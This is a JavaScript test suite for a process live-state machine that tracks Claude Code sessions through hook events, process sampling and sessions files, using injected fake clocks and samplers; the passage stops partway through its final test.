// The live-state machine and the heartbeat (lib/server/mirror/live.js, spec §2.6;
// the chrome's wording of it is §7.3).
//
// Pinned:
//   * the state machine's table, row by row, and that the first matching row wins;
//   * only a gone process is ended: two CONSECUTIVE verdict-bearing samples that
//     omit it with kill 0 saying ESRCH, or a start-time mismatch — and a sample
//     with alive:null never moves anything, so a quiet live process is never ended;
//   * busy → idle (or waiting → idle) with an open turn and no Stop inside
//     STOP_GRACE_MS emits exactly one turn-closed {by:'status'} — from this file,
//     or, wired to the real turn machine, from the turn machine and nothing else;
//     a Stop inside the grace emits none;
//   * pending asks: an sdk entrypoint is never pending; confirmation needs the
//     sessions file's `waiting`, or no sessions file at all; a newer event of the
//     same session and agent clears one, except the ask's own PreToolUse;
//   * arrival order never changes the outcome (PostToolUse before PreToolUse, the
//     newest-ts step, asks answered before they arrive, every permutation of a
//     turn's async hooks);
//   * quiet, with and without CPU data;
//   * the sampling cadence, and that this file never spawns a real `ps`;
//   * every constant is exported by name.
//
// Everything runs on an injected clock, sampler, kill-0 and timers: no process is
// sampled, signalled or spawned, and no wall clock is asserted on unless
// WEB_CHAT_PERF=1 (spec §10.1).

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const childProcess = require('node:child_process');

// ── no real `ps`: every spawn this file's code could reach is watched ──
const psCalls = [];
for (const name of ['spawn', 'spawnSync', 'execFile', 'execFileSync', 'exec', 'execSync']) {
  const original = childProcess[name];
  childProcess[name] = function watched(cmd, ...rest) {
    if (typeof cmd === 'string' && /(^|[/\s])ps(\s|$)/.test(cmd)) psCalls.push(name);
    return original.call(this, cmd, ...rest);
  };
}

const liveModule = require('../lib/server/mirror/live');
const {
  createLive,
  PROC_SAMPLE_ACTIVE_MS, PROC_SAMPLE_IDLE_MS, CPU_WINDOW_MS, CPU_TICK_PCT,
  QUIET_MODEL_MS, QUIET_TOOL_MS, QUIET_CPU_MS, STALE_BUSY_MS, STOP_GRACE_MS, HOOK_SILENCE_UNKNOWN_MS,
  TOMBSTONE_MS, CPU_STALE_MS, NO_CPU_FACTOR,
  STATES, WAITING_KINDS, CLEARED_BY, ENDED_REASONS,
} = liveModule;
const { createModel } = require('../lib/server/mirror/model');
const { createTurnMachine } = require('../lib/server/mirror/turn-machine');
const { toolKind, stepLabel, callLabel } = require('../lib/core/tool-input');
const { stableKey } = require('../lib/core/stable-json');
const { formatProcStart } = require('../lib/core/portfiles');

const C = 'conv-1';
const S = 'sess-1';
const PID = 4242;
const T0 = Date.UTC(2026, 9, 2, 9, 0, 0);
const START_MS = Date.UTC(2026, 9, 2, 8, 0, 0); // the Claude Code process's start
const PROC_START = formatProcStart(START_MS); // its sessions file's procStart text

// A redactor fake: masks the sentinel and nothing else.
const redactor = {
  text: (s) => s.replace(/SECRET[A-Za-z0-9_]*/g, '[MASK]'),
  value: (v) => JSON.parse(JSON.stringify(v).replace(/SECRET[A-Za-z0-9_]*/g, '[MASK]')),
};
const redact = (s) => redactor.text(s);

// sampleProcs entries (lib/core/portfiles).
const alive = (cpuMs = 0, state = 'S+', startedAt = START_MS) => ({ alive: true, startedAt, cpuMs, state });
const ABSENT = Object.freeze({ alive: false, startedAt: null, cpuMs: null, state: null });
const NO_VERDICT = Object.freeze({ alive: null, startedAt: null, cpuMs: null, state: null });
// A process using `pct` percent of one core since `from`.
const cpuRate = (pct, from = T0, state = 'S+') => (pid, at) => alive(Math.max(0, Math.round((pct / 100) * (at - from))), state);

const settle = () => new Promise((resolve) => setImmediate(resolve));

// An injected clock and its timers. advance() runs every timer that falls due,
// in time order, and lets the promise chains each one starts settle.
function fakeClock(start = T0) {
  let t = start;
  let seq = 0;
  const pending = new Map();
  return {
    now: () => t,
    set(ms) { t = ms; },
    timers: {
      setTimeout(fn, ms) { seq += 1; pending.set(seq, { at: t + Math.max(0, Number(ms) || 0), fn }); return seq; },
      clearTimeout(id) { pending.delete(id); },
    },
    delays: () => [...pending.values()].map((p) => p.at - t).sort((a, b) => a - b),
    count: () => pending.size,
    async advance(ms) {
      const end = t + ms;
      for (;;) {
        let next = null;
        for (const [id, p] of pending) if (p.at <= end && (!next || p.at < next[1].at)) next = [id, p];
        if (!next) break;
        pending.delete(next[0]);
        t = Math.max(t, next[1].at);
        next[1].fn();
        await settle();
      }
      t = end;
      await settle();
    },
  };
}

// An injected sampler: a rule (an entry, or (pid, at) → entry) and a queue of
// one-off entries, consumed one per sample.
function fakeSampler(clock, rule = alive(0)) {
  const calls = [];
  const queue = [];
  let current = rule;
  return {
    calls,
    set(e) { current = e; },
    then(...entries) { queue.push(...entries); },
    fn(pids) {
      calls.push([...pids]);
      const at = clock.now();
      const one = queue.length ? queue.shift() : null;
      const pick = one || current;
      return Promise.resolve(new Map(pids.map((p) => [p, typeof pick === 'function' ? pick(p, at) : pick])));
    },
  };
}

// The turn machine's open-turn reader, as a fake the tests drive.
function fakeTurns() {
  const open = new Map();
  const all = new Map();
  return {
    openTurnOf: (cid) => open.get(cid) || null,
    turnOf: (id) => all.get(id) || null,
    open(cid, id, sid, at) {
      const h = { id, conversation_id: cid, session_id: sid, status: 'open', started_at: at };
      open.set(cid, h);
      all.set(id, h);
      return h;
    },
    close(cid, id, status, at, extra = {}) {
      const h = { ...(all.get(id) || { id, conversation_id: cid, session_id: S, started_at: at }), status, ended_at: at, ...extra };
      all.set(id, h);
      if (open.get(cid) && open.get(cid).id === id) open.delete(cid);
      return h;
    },
  };
}

const tool = (name, useId, input = {}, extra = {}) => ({
  name, use_id: useId, kind: toolKind(name), label: stepLabel(name, input), call: callLabel(name, input), input,
  input_hash: `hash-${useId}`, ...extra,
});

function harness({
  pid = PID, procStart = PROC_START, entrypoint = 'cli', withRedact = true, rule = alive(0), kill0 = true, conversation = {},
} = {}) {
  const clock = fakeClock();
  const sampler = fakeSampler(clock, rule);
  const kill = { answer: kill0, calls: [] };
  const transitions = [];
  const lives = [];
  const turns = fakeTurns();
  const live = createLive({
    now: clock.now,
    timers: clock.timers,
    sampleProcs: (pids) => sampler.fn(pids),
    isPidAlive: (p) => { kill.calls.push(p); return typeof kill.answer === 'function' ? kill.answer(p) : kill.answer; },
    redact: withRedact ? redact : null,
    openTurnOf: turns.openTurnOf,
    turnOf: turns.turnOf,
    transition: (t) => transitions.push(t),
    onLive: (cid, l) => lives.push([cid, l]),
  });
  live.onConversation({ change: 'added', conversation: {
    id: C, current_session_id: S, sessions: [{ session_id: S }],
    process: pid ? { pid, proc_start: procStart, entrypoint } : null, ...conversation,
  } });
  const envelope = (event, fields = {}) => ({ v: 1, event, ts: clock.now(), session_id: S, prompt_id: null, entrypoint, agent: null, ...fields });
  const hook = (event, fields = {}) => live.ingest(C, envelope(event, fields));
  const file = (status, extra = {}) => live.noteSessionState(C, { status, waitingFor: null, sessionId: S, procStart, entrypoint, kind: 'interactive', ...extra });
  const openTurn = (id = 'p1', at = clock.now()) => { const h = turns.open(C, id, S, at); live.onTurnOpened(h); return h; };
  const closeTurn = (id = 'p1', status = 'done', extra = {}) => { const h = turns.close(C, id, status, clock.now(), extra); live.onTurnClosed(h); return h; };
  // A prompt as the engine sees it: the hook, then the turn machine opening the turn.
  const prompt = (id = 'p1') => { hook('UserPromptSubmit', { prompt_id: id, prompt: { author: 'user', text: 'go' } }); return openTurn(id); };
  return {
    clock, sampler, kill, transitions, lives, turns, live, envelope, hook, file, openTurn, closeTurn, prompt,
    sample: () => live.sampleNow(),
    state: () => live.stateOf(C),
    L: () => live.liveOf(C),
    ofOp: (op) => transitions.filter((t) => t.op === op),
  };
}

// The real model and turn machine, wired to live.js as the facade wires them.
// `liveFirst` hands each envelope to live.js before the turn machine (§2.12's
// order) instead of after (a source's onIngest).
function wired({ pid = PID, procStart = PROC_START, entrypoint = 'cli', rule = alive(0), liveFirst = false } = {}) {
  const clock = fakeClock();
  const sampler = fakeSampler(clock, rule);
  const sink = [];
  const model = createModel({ redactor });
  let live = null;
  const tm = createTurnMachine({
    model,
    now: clock.now,
    transition: (t) => sink.push(t),
    onTurnOpened: (t) => live && live.onTurnOpened(t),
    onTurnClosed: (t) => live && live.onTurnClosed(t),
  });
  live = createLive({
    now: clock.now,
    timers: clock.timers,
    sampleProcs: (pids) => sampler.fn(pids),
    isPidAlive: () => true,
    redact: (s) => model.scrubText(s),
    openTurnOf: (cid) => { const id = tm.openTurnOf(cid); return id ? model.turn(id) : null; },
    turnOf: (id) => model.turn(tm.resolve(id)),
    transition: (t) => sink.push(t),
    statusClosed: (d) => tm.statusClosed(d),
    processGone: (cid, o) => tm.processGone(cid, o),
    onLive: (cid, l) => model.upsertLive(cid, l),
  });
  live.onConversation({ change: 'added', conversation: {
    id: C, current_session_id: S, sessions: [{ session_id: S }], process: pid ? { pid, proc_start: procStart, entrypoint } : null,
  } });
  const envelope = (event, fields = {}) => ({ v: 1, event, ts: clock.now(), session_id: S, prompt_id: null, entrypoint, agent: null, ...fields });
  const hook = (event, fields = {}) => {
    const env = envelope(event, fields);
    if (liveFirst) { live.ingest(C, env); tm.ingest(C, env); } else { tm.ingest(C, env); live.ingest(C, env); }
  };
  const file = (status, extra = {}) => live.noteSessionState(C, { status, waitingFor: null, sessionId: S, procStart, entrypoint, ...extra });
  return {
    clock, sampler, sink, model, tm, live, envelope, hook, file,
    state: () => live.stateOf(C),
    L: () => live.liveOf(C),
    closes: () => sink.filter((t) => t.op === 'turn-closed'),
  };
}

const LIVE_KEYS = ['state', 'since', 'quiet', 'stale_status', 'step', 'waiting', 'last_activity_at', 'turn_started_at',
  'last_turn', 'process', 'evidence', 'ended_reason'];

// ── the constants ─────────────────────────────────────────────────────────────

test('every constant of §2.6 is exported by name, with the spec value', () => {
  const table = {
    PROC_SAMPLE_ACTIVE_MS: 5000, PROC_SAMPLE_IDLE_MS: 15000, CPU_WINDOW_MS: 20000, CPU_TICK_PCT: 2.5,
    QUIET_MODEL_MS: 90000, QUIET_TOOL_MS: 600000, QUIET_CPU_MS: 45000, STALE_BUSY_MS: 600000, STOP_GRACE_MS: 2000,
    HOOK_SILENCE_UNKNOWN_MS: 600000, DISCOVERY_MS: 10000,
  };
  for (const [name, value] of Object.entries(table)) assert.strictEqual(liveModule[name], value, name);
  assert.strictEqual(liveModule.TOMBSTONE_MS, 60000, 'an ended tool_use_id is remembered for 60 s');
  assert.strictEqual(liveModule.GONE_SAMPLES, 2, 'two consecutive samples');
  assert.strictEqual(liveModule.NO_CPU_FACTOR, 2, 'with no CPU data, the time conditions doubled');
});

test('every numeric constant and every vocabulary in live.js is exported by name', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'lib', 'server', 'mirror', 'live.js'), 'utf8');
  const numeric = [...src.matchAll(/^const ([A-Z][A-Z0-9_]*) = \d/gm)].map((m) => m[1]);
  const vocab = [...src.matchAll(/^const ([A-Z][A-Z0-9_]*) = Object\.freeze\(\[/gm)].map((m) => m[1]);
  assert.ok(numeric.length >= 16, `found ${numeric.length} numeric constants`);
  for (const name of [...numeric, ...vocab]) {
    assert.ok(Object.prototype.hasOwnProperty.call(liveModule, name), `${name} is not exported`);
    assert.ok(typeof liveModule[name] === 'number' || Array.isArray(liveModule[name]), name);
  }
  assert.deepEqual([...STATES], ['ended', 'suspended', 'question', 'waiting', 'compacting', 'working', 'idle', 'unknown']);
  assert.deepEqual([...WAITING_KINDS], ['permission', 'question', 'plan', 'other']);
  assert.deepEqual([...CLEARED_BY], ['terminal', 'web', 'esc', 'tool-ran', 'turn-closed']);
  // §2.6's vocabularies have their one home here: emit.js imports these three (U12b).
  assert.deepEqual([...ENDED_REASONS], ['process-gone', 'start-mismatch', 'session-end']);
  for (const v of [STATES, WAITING_KINDS, CLEARED_BY, ENDED_REASONS]) assert.ok(Object.isFrozen(v));
});

test('createLive needs the turn machine\'s open-turn reader', () => {
  assert.throws(() => createLive({}), /openTurnOf/);
});

// ── the live object ───────────────────────────────────────────────────────────

test('the live object carries every key, always, in the §2.6 shape', async () => {
  const h = harness();
  await h.sample();
  h.prompt();
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Edit', 'tu1', { file_path: '/p/QueueRail.tsx' }) });
  const l = h.L();
  assert.deepEqual(Object.keys(l), LIVE_KEYS);
  assert.equal(l.state, 'working');
  assert.deepEqual(l.step, { kind: 'Edit', tool: 'Edit', label: 'Edit · QueueRail.tsx', started_at: T0 });
  assert.equal(l.turn_started_at, T0);
  assert.equal(l.last_activity_at, T0);
  assert.deepEqual(l.process, { pid: PID, alive: true, cpu_pct: null });
  assert.deepEqual(l.evidence, { hook_at: T0, transcript_at: null, task_output_at: null, sessions_file_at: null, proc: 'alive' });
  assert.equal(l.stale_status, false);
  assert.equal(l.quiet, null);
  assert.equal(l.waiting, null);
  assert.equal(l.ended_reason, null);
  // Every write to the model names every key, so a merge never keeps a stale one.
  for (const [, written] of h.lives) assert.deepEqual(Object.keys(written), LIVE_KEYS);
});

test('the live object goes through the real model\'s upsertLive intact, redacted and capped there', () => {
  const w = wired();
  w.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
  w.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'deploy --token SECRET_abc123' }) });
  const stored = w.model.serializeLive(C);
  const mine = w.L();
  delete stored.rev;
  assert.deepEqual(stored, mine);
  assert.equal(stored.step.label, 'Bash · deploy --token [MASK]');
  assert.ok(!JSON.stringify(stored).includes('SECRET'));
});

// ── the table, row by row ─────────────────────────────────────────────────────

test('row 1: two consecutive verdict samples that omit the pid, with kill 0 saying ESRCH, end it — once', async () => {
  const h = harness();
  await h.sample();
  assert.equal(h.state(), 'idle');
  h.sampler.set(ABSENT);
  h.kill.answer = false; // ESRCH
  await h.sample();
  // One verdict is not enough to end it. It is no longer known to be alive, so
  // with nothing else to go on (no sessions file, no hook) it is unknown.
  assert.equal(h.state(), 'unknown', 'one verdict is not enough');
  assert.equal(h.L().process.alive, false);
  assert.equal(h.L().evidence.proc, 'unknown');
  assert.equal(h.ofOp('process-gone').length, 0);
  h.clock.set(T0 + 15000);
  await h.sample();
  assert.equal(h.state(), 'ended');
  assert.equal(h.L().ended_reason, 'process-gone');
  assert.equal(h.L().evidence.proc, 'gone');
  assert.equal(h.L().since, T0 + 15000);
  assert.deepEqual(h.ofOp('process-gone'), [{ kind: 'mirror', op: 'process-gone', conversation_id: C, session_ids: [S], pid: PID }]);
  // Gone is gone: the pid is not sampled again, and nothing is emitted twice.
  const asked = h.sampler.calls.length;
  await h.sample();
  assert.equal(h.sampler.calls.length, asked);
  assert.equal(h.ofOp('process-gone').length, 1);
  assert.deepEqual(h.kill.calls, [PID, PID]);
});

test('row 1: an omission that kill 0 contradicts, or a live sample between, breaks the run of verdicts', async () => {
  const h = harness();
  await h.sample();
  h.sampler.set(ABSENT);
  h.kill.answer = true; // ps did not list it, but kill 0 still reaches it
  await h.sample();
  await h.sample();
  await h.sample();
  assert.equal(h.state(), 'idle', 'never ended while kill 0 finds the process');
  h.kill.answer = false;
  await h.sample(); // miss 1
  h.sampler.then(alive(0)); // alive again in between
  await h.sample();
  await h.sample(); // miss 1 again
  assert.notEqual(h.state(), 'ended');
  await h.sample(); // miss 2, consecutive
  assert.equal(h.state(), 'ended');
});

test('row 1: a start-time mismatch ends it at once — against the sessions file\'s procStart, or a start pinned by the first sample', async () => {
  const h = harness();
  await h.sample();
  h.sampler.set(alive(0, 'S+', START_MS + 60000)); // pid reused by another process
  await h.sample();
  assert.equal(h.state(), 'ended');
  assert.equal(h.L().ended_reason, 'start-mismatch');
  assert.equal(h.ofOp('process-gone').length, 1);

  // ±2 s is the same process (procStart and lstart have one-second resolution).
  const near = harness();
  near.sampler.set(alive(0, 'S+', START_MS + 1999));
  await near.sample();
  assert.equal(near.state(), 'idle');

  // No procStart known: the first sample's start is pinned and judged later.
  const p = harness({ procStart: null });
  p.sampler.set(alive(0, 'S+', START_MS + 5000));
  await p.sample();
  assert.equal(p.state(), 'idle');
  await p.sample();
  assert.equal(p.state(), 'idle');
  p.sampler.set(alive(0, 'S+', START_MS + 9000));
  await p.sample();
  assert.equal(p.state(), 'ended');
  assert.equal(p.L().ended_reason, 'start-mismatch');
});

test('row 1: with no pid known, a SessionEnd that is not clear or resume ends it; a later hook revives it, in either order', () => {
  const h = harness({ pid: null });
  h.hook('SessionStart', { session: { source: 'startup' } });
  h.clock.set(T0 + 100);
  h.hook('SessionEnd', { session: { reason: 'clear' } });
  assert.equal(h.state(), 'idle');
  h.hook('SessionEnd', { session: { reason: 'resume' }, ts: T0 + 110 });
  assert.equal(h.state(), 'idle');
  h.hook('SessionEnd', { session: { reason: 'prompt_input_exit' }, ts: T0 + 120 });
  assert.equal(h.state(), 'ended');
  assert.equal(h.L().ended_reason, 'session-end');
  assert.equal(h.L().evidence.proc, 'unknown');
  assert.equal(h.L().since, T0 + 100, 'since the SessionEnd, clamped to the clock');
  assert.equal(h.ofOp('process-gone').length, 0, 'no process verdict without a process');
  h.clock.set(T0 + 500);
  h.hook('SessionStart', { session: { source: 'resume' } });
  assert.equal(h.state(), 'idle');

  // The newer hook arriving first: the older SessionEnd ends nothing.
  const o = harness({ pid: null });
  o.hook('SessionStart', { session: { source: 'resume' }, ts: T0 + 500 });
  o.hook('SessionEnd', { session: { reason: 'other' }, ts: T0 + 120 });
  assert.equal(o.state(), 'idle');
});

test('row 1: with a pid known, a SessionEnd ends nothing — only the process verdict does', async () => {
  const h = harness();
  await h.sample();
  h.hook('SessionEnd', { session: { reason: 'prompt_input_exit' } });
  assert.equal(h.state(), 'idle');
  h.sampler.set(ABSENT);
  h.kill.answer = false;
  await h.sample();
  await h.sample();
  assert.equal(h.state(), 'ended');
  assert.equal(h.L().ended_reason, 'process-gone');
});

test('row 1: the registry\'s ended conversation with no process stays ended until a hook says otherwise', () => {
  const h = harness({ pid: null, conversation: { ended_at: T0 - 60000 } });
  assert.equal(h.state(), 'ended');
  assert.equal(h.L().ended_reason, 'session-end');
  assert.equal(h.L().since, T0 - 60000);
  h.hook('SessionStart', { session: { source: 'resume' } });
  assert.equal(h.state(), 'idle');
});

test('row 2: a stopped process (Ctrl-Z) is suspended, until a sample or newer progress says it runs', async () => {
  const h = harness();
  await h.sample();
  h.prompt();
  h.sampler.set(alive(0, 'T+'));
  h.clock.set(T0 + 1000);
  await h.sample();
  assert.equal(h.state(), 'suspended');
  assert.equal(h.L().evidence.proc, 'stopped');
  h.sampler.set(alive(0, 'S+'));
  await h.sample();
  assert.equal(h.state(), 'working');

  h.sampler.set(alive(0, 'T'));
  h.clock.set(T0 + 2000);
  await h.sample();
  assert.equal(h.state(), 'suspended');
  h.clock.set(T0 + 3000);
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Read', 'tu1', { file_path: 'a.js' }) }); // `fg`, and it carries on
  assert.equal(h.state(), 'working');
  assert.equal(h.L().evidence.proc, 'alive');
});

test('row 2: a background shell writing on while Claude is stopped does not un-suspend it', async () => {
  const h = harness();
  h.prompt();
  h.sampler.set(alive(0, 'T+'));
  h.clock.set(T0 + 1000);
  await h.sample();
  assert.equal(h.state(), 'suspended');
  h.clock.set(T0 + 2000);
  h.live.noteActivity(C, T0 + 2000, 'task_output'); // a setsid'd `npm run dev` keeps printing
  assert.equal(h.state(), 'suspended');
  h.live.noteActivity(C, T0 + 2000, 'transcript'); // Claude wrote: it runs
  assert.equal(h.state(), 'working');
});

test('a re-link to another process starts its facts again; the same process keeps them', async () => {
  const h = harness();
  h.sampler.set(ABSENT);
  h.kill.answer = false;
  await h.sample();
  await h.sample();
  assert.equal(h.state(), 'ended');
  // The same process again (the registry restating its link) changes nothing.
  h.live.onConversation({ change: 'linked', conversation: { id: C, process: { pid: PID, proc_start: PROC_START } } });
  assert.equal(h.state(), 'ended');
  // A resume in a new process that drew the old pid: another start, so another process.
  const later = formatProcStart(START_MS + 3600000);
  h.live.onConversation({ change: 'linked', conversation: { id: C, process: { pid: PID, proc_start: later } } });
  assert.notEqual(h.state(), 'ended');
  h.sampler.set(alive(0, 'S+', START_MS + 3600000));
  await h.sample();
  assert.equal(h.state(), 'idle', 'its own start: no mismatch');
  // And a new pid outright.
  h.live.onConversation({ change: 'linked', conversation: { id: C, process: { pid: PID + 1, proc_start: PROC_START } } });
  assert.equal(h.L().process.pid, PID + 1);
  assert.equal(h.L().process.alive, null, 'not sampled yet');
});

test('row 3: a confirmed pending ask is a question, a permission or a plan, with its tool and what it asks', () => {
  const q = harness({ pid: null }); // no sessions file linked at all: confirmed by itself
  q.prompt();
  q.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('AskUserQuestion', 'tq', { questions: [{ header: 'Rail', question: 'Keep the 56px rail?', options: [{ label: 'Yes' }] }] }) });
  assert.equal(q.state(), 'question');
  assert.deepEqual(q.L().waiting, { kind: 'question', tool: 'AskUserQuestion', summary: 'Keep the 56px rail?', pending: true, tool_use_id: 'tq' });

  const p = harness({ pid: null });
  p.prompt();
  p.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'rm -rf dist && npm run build' }) });
  assert.equal(p.state(), 'waiting');
  assert.deepEqual(p.L().waiting, { kind: 'permission', tool: 'Bash', summary: 'Bash(rm -rf dist && npm run build)', pending: true, tool_use_id: 'tb' });
  const st = p.ofOp('state').at(-1);
  assert.equal(st.state, 'waiting');
  assert.equal(st.waiting_kind, 'permission');

  const pl = harness({ pid: null });
  pl.prompt();
  pl.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('ExitPlanMode', 'tp', { planFilePath: '/p/plan.md' }), ask: { id: 'ask_0123456789ab', kind: 'plan' } });
  assert.equal(pl.state(), 'waiting');
  assert.deepEqual(pl.L().waiting, { kind: 'plan', tool: 'ExitPlanMode', summary: null, pending: true, ask_id: 'ask_0123456789ab', tool_use_id: 'tp' });
  assert.equal(pl.ofOp('state').at(-1).ask_id, 'ask_0123456789ab');
});

test('row 3: the sessions file alone says waiting — a question, a permission or something else', () => {
  const q = harness();
  q.file('waiting', { waitingFor: 'input needed' });
  assert.equal(q.state(), 'question');
  assert.deepEqual(q.L().waiting, { kind: 'question', tool: null, summary: null, pending: false });

  const p = harness();
  p.file('waiting', { waitingFor: 'permission prompt' });
  assert.equal(p.state(), 'waiting');
  assert.deepEqual(p.L().waiting, { kind: 'permission', tool: null, summary: null, pending: false });

  const o = harness();
  o.file('waiting', { waitingFor: 'dialog open' });
  assert.equal(o.state(), 'waiting');
  assert.deepEqual(o.L().waiting, { kind: 'other', tool: null, summary: 'dialog open', pending: false });

  // Without a redactor the text is not kept, but the kind still is.
  const bare = harness({ withRedact: false });
  bare.file('waiting', { waitingFor: 'permission prompt' });
  assert.equal(bare.L().waiting.kind, 'permission');
});

test('row 4: PreCompact is compacting until SessionStart(compact), the boundary or a later main-agent event — whatever order they arrive in', () => {
  const h = harness();
  h.prompt();
  h.clock.set(T0 + 100);
  h.hook('PreCompact', { compact: { trigger: 'auto' } });
  assert.equal(h.state(), 'compacting');
  assert.deepEqual(h.L().step, { kind: 'Compacting', tool: null, label: 'Compacting', started_at: T0 + 100 });
  h.clock.set(T0 + 20000);
  h.hook('SessionStart', { session: { source: 'compact' } });
  assert.equal(h.state(), 'working');

  const o = harness();
  o.prompt();
  o.hook('SessionStart', { session: { source: 'compact' }, ts: T0 + 20000 });
  o.hook('PreCompact', { compact: { trigger: 'auto' }, ts: T0 + 100 });
  assert.equal(o.state(), 'working', 'the end arrived first: never compacting');

  const b = harness();
  b.prompt();
  b.hook('PreCompact', { ts: T0 + 100 });
  b.live.onChanges(S, [{ type: 'compact', uuid: 'u1', ts: T0 + 18000 }]);
  assert.equal(b.state(), 'working', 'the transcript\'s compact_boundary ends it');

  const m = harness();
  m.prompt();
  m.hook('PreCompact', { ts: T0 + 100 });
  m.hook('PreToolUse', { prompt_id: 'p1', ts: T0 + 30000, tool: tool('Read', 'tu9', { file_path: 'a.js' }) });
  assert.equal(m.state(), 'working', 'the turn went on: compaction ended without its SessionStart');
  m.hook('PreToolUse', { prompt_id: 'p1', ts: T0 + 50, tool: tool('Read', 'tu8', { file_path: 'b.js' }) });
  assert.equal(m.state(), 'working');
});

test('row 5: an open turn is working; so is a busy sessions file with recent progress or a ticking CPU', async () => {
  const h = harness();
  h.prompt();
  assert.equal(h.state(), 'working');
  assert.equal(h.L().turn_started_at, T0);

  const b = harness();
  b.file('busy', { updatedAt: T0 });
  assert.equal(b.state(), 'working', 'busy, written just now');

  const t = harness({ rule: cpuRate(5) });
  t.file('busy', { updatedAt: T0 - 20 * 86400000 }); // F7: written 18+ days ago
  await t.sample();
  assert.equal(t.state(), 'idle');
  assert.equal(t.L().stale_status, true);
  t.clock.set(T0 + 15000);
  await t.sample();
  assert.equal(t.L().process.cpu_pct, 5);
  assert.equal(t.state(), 'working', 'the CPU ticks: the busy is believed');
});

test('row 6: alive, a sessions file present or a recent hook is idle; a stale busy says so', async () => {
  const a = harness();
  await a.sample();
  assert.equal(a.state(), 'idle');
  assert.equal(a.L().stale_status, false);

  const f = harness({ pid: null });
  f.file('idle');
  assert.equal(f.state(), 'idle');

  const k = harness({ pid: null });
  k.hook('SessionStart', { session: { source: 'startup' } });
  assert.equal(k.state(), 'idle');
  k.clock.set(T0 + HOOK_SILENCE_UNKNOWN_MS);
  k.live.noteActivity(C, T0, 'transcript'); // a recompute; nothing newer
  assert.equal(k.state(), 'idle');
  k.clock.set(T0 + HOOK_SILENCE_UNKNOWN_MS + 1);
  k.live.noteActivity(C, T0, 'transcript');
  assert.equal(k.state(), 'unknown', 'no recent sign of the session: unknown, never ended');

  const s = harness({ rule: cpuRate(1) });
  s.file('busy', { updatedAt: T0 - STALE_BUSY_MS - 1 });
  await s.sample();
  s.clock.set(T0 + 15000);
  await s.sample();
  assert.equal(s.state(), 'idle');
  assert.equal(s.L().stale_status, true);
});

test('time alone moves a state on the clock: a busy grown stale, a session gone silent', async () => {
  const s = harness({ pid: null });
  s.live.start();
  s.file('busy', { updatedAt: T0 });
  assert.equal(s.state(), 'working');
  await s.clock.advance(STALE_BUSY_MS);
  assert.equal(s.state(), 'working');
  await s.clock.advance(1);
  assert.equal(s.state(), 'idle');
  assert.equal(s.L().stale_status, true);
  await s.live.stop();

  const k = harness({ pid: null });
  k.live.start();
  k.hook('SessionStart', { session: { source: 'startup' } });
  await k.clock.advance(HOOK_SILENCE_UNKNOWN_MS);
  assert.equal(k.state(), 'idle');
  await k.clock.advance(1);
  assert.equal(k.state(), 'unknown');
  assert.ok(!k.transitions.some((t) => t.state === 'ended'));
  await k.live.stop();
});

test('liveOf answers by conversation id or by any of its session ids', () => {
  const h = harness();
  h.live.onConversation({ change: 'linked', conversation: { id: C, sessions: [{ session_id: S }, { session_id: 'sess-after-clear' }] } });
  assert.deepEqual(h.live.liveOf('sess-after-clear'), h.live.liveOf(C));
  assert.deepEqual(h.live.liveOf(S), h.live.liveOf(C));
  assert.equal(h.live.liveOf('nobody'), null);
});

test('row 7: no evidence at all is unknown', () => {
  const h = harness({ pid: null });
  assert.equal(h.state(), 'unknown');
  assert.equal(h.L().process, null);
  assert.equal(h.L().evidence.proc, 'unknown');
});

test('the first matching row wins: ended over suspended over waiting over compacting over working', async () => {
  const h = harness({ pid: null });
  h.prompt();
  h.hook('PreCompact', { ts: T0 + 1 });
  assert.equal(h.state(), 'compacting', 'compacting over working');
  h.hook('PermissionRequest', { prompt_id: 'p1', ts: T0 + 2, tool: tool('Bash', 'tb', { command: 'ls' }), input_hash: 'x' });
  assert.equal(h.state(), 'waiting', 'waiting over compacting');

  const s = harness();
  s.prompt();
  s.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  s.file('waiting', { waitingFor: 'permission prompt' });
  assert.equal(s.state(), 'waiting');
  s.sampler.set(alive(0, 'T+'));
  s.clock.set(T0 + 1000);
  await s.sample();
  assert.equal(s.state(), 'suspended', 'suspended over waiting');
  assert.equal(s.L().waiting, null);
  s.sampler.set(alive(0, 'T+', START_MS + 10000));
  await s.sample();
  assert.equal(s.state(), 'ended', 'ended over everything');
  assert.equal(s.L().step, null);
  assert.equal(s.L().turn_started_at, null);
});

// ── a failed sample is no verdict ────────────────────────────────────────────

test('a sample with alive:null never moves a state — not working, not suspended, not the run of misses', async () => {
  const h = harness();
  await h.sample();
  h.prompt();
  h.sampler.set(NO_VERDICT);
  for (let i = 1; i <= 50; i++) { h.clock.set(T0 + i * 5000); await h.sample(); }
  assert.equal(h.state(), 'working');
  assert.equal(h.L().process.alive, true, 'the last verdict stands');
  assert.deepEqual(h.kill.calls, [], 'no verdict, so not even kill 0 is asked');

  const s = harness();
  s.sampler.set(alive(0, 'T+'));
  await s.sample();
  assert.equal(s.state(), 'suspended');
  s.sampler.set(NO_VERDICT);
  await s.sample();
  await s.sample();
  assert.equal(s.state(), 'suspended');

  // A null between two omissions does not break them: they are consecutive verdicts.
  const g = harness({ kill0: false });
  await g.sample();
  g.sampler.then(ABSENT, NO_VERDICT, NO_VERDICT, ABSENT);
  await g.sample();
  await g.sample();
  await g.sample();
  assert.notEqual(g.state(), 'ended');
  await g.sample();
  assert.equal(g.state(), 'ended');
});

test('a sampler that throws, rejects or answers garbage gives no verdict', async () => {
  for (const sampleProcs of [
    () => { throw new Error('EAGAIN'); },
    () => Promise.reject(new Error('boom')),
    () => Promise.resolve('not a map'),
    () => Promise.resolve(new Map([[PID, { alive: 'yes' }]])),
  ]) {
    const transitions = [];
    const live = createLive({ now: () => T0, sampleProcs, isPidAlive: () => false, openTurnOf: () => null, transition: (t) => transitions.push(t) });
    live.onConversation({ change: 'added', conversation: { id: C, process: { pid: PID } } });
    await live.sampleNow();
    await live.sampleNow();
    await live.sampleNow();
